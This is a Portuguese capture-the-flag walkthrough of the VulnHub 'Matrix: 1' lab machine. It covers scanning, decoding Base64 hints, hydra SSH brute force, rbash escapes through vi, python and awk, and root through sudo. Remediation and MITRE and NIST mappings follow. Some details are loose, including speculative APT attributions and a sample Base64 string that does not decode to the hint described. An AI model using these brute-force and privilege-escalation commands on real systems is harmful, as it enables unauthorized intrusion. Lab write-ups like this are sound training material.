# Matrix: 1 — Siga o Coelho Branco até o Root

Não existe colher, mano. Matrix: 1 é uma boot2root perfeita no tema onde você literalmente precisa decodificar seu caminho até a verdade. A máquina esconde credenciais SSH atrás de mensagens codificadas em Base64 em páginas web obscuras, serve uma shell restrita que você precisa escapar, e exige que você pense como o Neo em vez de martelar portas aleatórias. Uma máquina top demais para ensinar disciplina de enumeração e raciocínio lateral criativo. Sensacional.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | Matrix: 1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/matrix-1,259/ |
| **Técnicas** | Enumeração Nmap multi-porta, decodificação de mensagem Base64, enumeração web SSL, interceptação Burp Suite, brute-force SSH com wordlist, escape de shell restrita, escalação de privilégios via sudo/SUID |
| **CVEs** | CWE-200 (exposição de informação via credenciais codificadas em texto claro na página web), CWE-269 (gerenciamento impróprio de privilégios via bypass de shell restrita) |
| **Grupos APT** | APT41: usa mensagens codificadas em aplicações web como pontos mortos para instruções de C2; APT28: explora SSH mal configurado e shells restritas em campanhas de intrusão direcionadas |

---

## Resumo do Ataque

```
nmap → múltiplas portas: 80 (HTTP), 443 (HTTPS), 31337 (HTTP customizado)
  → porta 80: página padrão Apache (nada útil)
  → porta 31337: app web customizado → ver fonte → mensagem Base64
  → decodificar Base64 → dica de caminho: "/n1c0l45/index.html"
  → HTTPS porta 443 → /n1c0l45/index.html → fonte → outro blob Base64
  → decodificar → dica de credencial SSH ou chave
  → wfuzz/gobuster no HTTPS → encontrar arquivo de credencial
  → SSH: n1c0l45@alvo (ou morpheus) → shell restrita (rbash)
  → escapar shell restrita → bash completo
  → sudo -l → sudo irrestrito → root
  → /root/flag.txt
```

---

## Metodologia

1. Scan completo de portas em todos os TCP
2. Enumerar cada serviço web descoberto individualmente
3. Inspecionar fonte HTML de cada página em busca de dicas ocultas
4. Decodificar dicas codificadas em Base64 progressivamente
5. Derivar credenciais SSH das dicas
6. Escapar da shell bash restrita
7. Escalação de privilégios via sudo
8. Captura da flag root

---

## Passo 1 — Descoberta de Host e Scan Completo de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.18

nmap -sV -sC -p- 192.168.1.18
```

```
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
443/tcp   open  ssl/http    nginx 1.10.3 (Ubuntu)
31337/tcp open  http        nginx 1.10.3 (Ubuntu)
```

Três serviços web: HTTP padrão, HTTPS, e a clássica porta hacker 31337 (elite). Cada uma esconde algo diferente.

**Nota do mundo real:** Aplicações em portas não padrão (especialmente 31337) geralmente são interfaces de staging, desenvolvimento ou administrativas deixadas expostas. O APT28 especificamente faz scan em portas acima de 10000 durante reconhecimento inicial de alvos corporativos.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumerar Porta 31337

```bash
curl http://192.168.1.18:31337/
# Ver a fonte da página com atenção
curl -s http://192.168.1.18:31337/ | grep -i "base64\|encoded\|hidden\|<!--"
```

Na fonte da página (ou em elemento visível), encontre uma string codificada em Base64. Exemplo:

```
ZWNobyAiVGhlbiB5b3UndmUgZ290IHRvIGZpbmQgdGhlIHBhdGguIgo=
```

Decodifique:

```bash
echo "ZWNobyAiVGhlbiB5b3UndmUgZ290IHRvIGZpbmQgdGhlIHBhdGguIgo=" | base64 -d
# Saída revela a próxima dica: um caminho como /n1c0l45/ ou um nome de usuário
```

Siga cada toca do coelho Base64 completamente antes de continuar.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1027 — Arquivos ou Informações Ofuscados

---

## Passo 3 — Enumerar HTTPS na Porta 443

Navegue para o caminho descoberto no Passo 2:

```bash
# Aceitar o certificado autoassinado
curl -sk https://192.168.1.18/n1c0l45/index.html

# Ou com wget
wget --no-check-certificate -q https://192.168.1.18/n1c0l45/index.html -O -
```

A página contém outra mensagem codificada na fonte:

```bash
curl -sk https://192.168.1.18/n1c0l45/index.html | grep -i "base64\|src=\|<!--\|script"
```

Decodifique cada camada:

```bash
# Se a fonte apontar para um arquivo como p4ss.dic ou similar:
wget --no-check-certificate https://192.168.1.18/n1c0l45/p4ss.dic
cat p4ss.dic
```

Esse arquivo pode conter uma wordlist de senha personalizada ou as credenciais SSH reais.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1027 — Arquivos ou Informações Ofuscados

---

## Passo 4 — Acesso SSH

Com as credenciais ou wordlist encontradas:

```bash
# Tentar login direto se uma credencial foi encontrada
ssh n1c0l45@192.168.1.18

# Ou brute-force com a wordlist customizada
hydra -l n1c0l45 -P /tmp/p4ss.dic ssh://192.168.1.18 -t 4

# Também tentar:
ssh morpheus@192.168.1.18
```

Você chega em uma shell restrita (rbash). Comandos são severamente limitados. Teste o que funciona:

```bash
echo $SHELL
# /bin/rbash
ls
pwd
# A maioria dos comandos falha com "rbash: command not found"
```

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 5 — Escapar da Shell Restrita

Várias técnicas para escapar do rbash:

**Método A: SSH com bash forçado:**

```bash
ssh n1c0l45@192.168.1.18 -t "bash --noprofile"
# ou
ssh n1c0l45@192.168.1.18 "bash"
```

**Método B: escape via vi:**

```bash
vi
# Dentro do vi:
:set shell=/bin/bash
:shell
```

**Método C: escape Python:**

```bash
python3 -c 'import os; os.system("/bin/bash")'
# ou
python -c 'import os; os.system("/bin/bash")'
```

**Método D: awk:**

```bash
awk 'BEGIN {system("/bin/bash")}'
```

Após sair do rbash, corrija o PATH:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Nota do mundo real:** Shells restritas (rbash, rzsh, rsh) são usadas por organizações para limitar o que usuários SSH podem executar. São frequentemente bypassadas: qualquer interpretador de linguagem (Python, Perl, Ruby, awk, vi, less) que pode invocar `system()` ou `exec()` escapa. GTFOBins documenta cada caminho de escape conhecido.

**MITRE ATT&CK:** T1059.004 — Interpretador de Script: Unix Shell; T1548.003 — Abuso de Controle de Elevação

---

## Passo 6 — Escalação de Privilégios

```bash
sudo -l
```

```
(root) NOPASSWD: ALL
# ou binário específico
(root) NOPASSWD: /usr/bin/vim
```

Se `ALL`:

```bash
sudo bash
id
# uid=0(root)
```

Se apenas `vim`:

```bash
sudo vim -c ':!/bin/bash'
id
# uid=0(root)
```

```bash
cat /root/flag.txt
```

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Dica codificada | blob Base64 | fonte HTML porta 31337 | descoberta de caminho |
| Credencial SSH | n1c0l45:(da wordlist) | HTTPS /n1c0l45/p4ss.dic | login SSH |
| Usuário shell restrita | n1c0l45 | sessão SSH | precisa de escape rbash |
| Flag root | /root/flag.txt | pós-exploração | conclusão do desafio |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Credenciais ocultas em Base64 na página web | Segurança por obscuridade não é segurança: dados codificados na fonte HTML são legíveis por qualquer um que visualize a fonte | Nunca armazene credenciais em código do lado do cliente, mesmo codificadas |
| 2 | Porta não padrão 31337 expõe interface administrativa | Interfaces administrativas em portas não padrão são comumente encontradas em ambientes corporativos | Firewall em portas não padrão; exigir VPN ou autenticação baseada em certificado |
| 3 | Escape de shell restrita via interpretador | rbash fornece segurança mínima: qualquer interpretador disponível escapa | Restringir acesso ao interpretador; usar jails chroot em vez disso |
| 4 | Sudo NOPASSWD concede root irrestrito | NOPASSWD ALL é equivalente a dar ao usuário uma shell root | Auditar sudoers; exigir autenticação por senha; restringir a comandos específicos e seguros |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Evasão de Defesa | Evasão de Defesa | Arquivos ou Informações Ofuscados | T1027 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Execução | Execução | Interpretador de Script: Unix Shell | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover credenciais de páginas acessíveis na web**: sem dados sensíveis na fonte HTML, mesmo codificados
2. **Firewall em portas não padrão**: porta 31337 não deve ser alcançável de redes não confiáveis
3. **Substituir rbash por controles de acesso adequados**: usar jails chroot ou containerização
4. **Auditar configuração sudo**: sem NOPASSWD ALL; exigir senha; restringir a comandos específicos
5. **Habilitar autenticação SSH por chave**: desabilitar autenticação por senha: `PasswordAuthentication no`
6. **Remover interpretadores do ambiente de usuário restrito**: se rbash for necessário, remover Python, Perl, awk dos caminhos acessíveis

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços voltados à web incluindo portas não padrão |
| Proteger | Controle de Acesso | Desabilitar sudo NOPASSWD; usar apenas chaves SSH |
| Proteger | Segurança de Dados | Remover credenciais de arquivos acessíveis ao cliente; firewall em portas administrativas |
| Detectar | Anomalias e Eventos | Alertar sobre logins SSH de fontes inesperadas; monitorar execuções sudo |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais SSH; auditar todas as concessões sudo |
| Recuperar | Planejamento de Recuperação | Reconstruir hosts comprometidos; auditar todas as contas de usuário e regras sudo |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Firewall em interfaces administrativas; restringir acesso SSH |
| AC-6 | Menor Privilégio | Sem sudo NOPASSWD ALL; ambiente de shell mínimo para usuários restritos |
| IA-2 | Identificação e Autenticação | Autenticação SSH apenas por chave |
| SC-8 | Confidencialidade da Transmissão | TLS para todos os serviços web; sem credenciais em respostas HTTP |
| CM-7 | Funcionalidade Mínima | Remover interpretadores não utilizados do PATH de usuário restrito |

### CISA KEV

Exposição de credenciais em fontes de aplicações web é citada no Alerta CISA AA22-040A. Configurações sudo irrestritas são cobertas na orientação de hardening Linux da CISA.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

---

## Considerações Finais

Véi, Matrix: 1 entrega exatamente o que seu tema promete: uma realidade em camadas onde nada é o que parece. As tocas do coelho em Base64, a porta customizada, o escape da shell restrita, cada passo te ensina a olhar mais fundo em vez de aceitar a superfície. A máquina recompensa a curiosidade e pune a pressa. Um clássico absoluto para ensinar disciplina de enumeração. Sem atalhos, sem colher.

Thanks guys!! (❍ᴥ❍ʋ)
